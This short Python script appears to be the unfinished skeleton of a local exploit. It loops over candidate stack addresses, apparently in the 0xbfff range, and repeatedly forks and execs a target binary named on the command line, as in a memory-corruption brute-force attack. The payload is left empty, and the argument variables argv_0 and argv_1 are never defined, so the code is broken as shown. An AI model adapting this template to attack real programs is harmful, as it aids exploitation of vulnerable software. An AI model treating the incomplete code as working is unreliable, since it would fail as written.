import os
import sys
import struct

p = lambda x : struct.pack("<I", x)
up = lambda x : struct.unpack(">I", x)[0]

path = os.getcwd() + "/" + sys.argv[1]

#for addr in range(0xbffff000, 0xbffffff0, 4) :
for high in range(0xff, 0x00, -1) :
	for low in range(0x00, 0x100, 4) :
		payload = ""

		pid = os.fork()
		if pid==0:
			os.execl(path, argv_0, argv_1)
		else:
			os.waitpid(pid,0)
